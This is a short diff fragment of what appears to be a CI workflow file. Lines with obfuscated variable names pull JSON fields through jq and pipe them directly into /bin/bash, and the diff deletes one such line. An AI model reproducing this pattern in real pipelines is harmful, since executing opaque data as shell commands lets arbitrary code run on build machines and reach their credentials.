@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$xodab8" | jq -r .lwf2598 | /bin/bash
           echo $isncn2 | jq -r .gfiq37968 | /bin/bash
           printf '%s' "$tm2" | jq -r .l6 | /bin/bash
-          printf '%s' "$bley3" | jq -r .lnd73371 | /bin/bash
           echo $a725 | jq -r .k65326 | /bin/bash
           printf '%s' "$gj7" | jq -r .dpymw35852 | /bin/bash
           echo $pwc84 | jq -r .ni00265 | /bin/bash
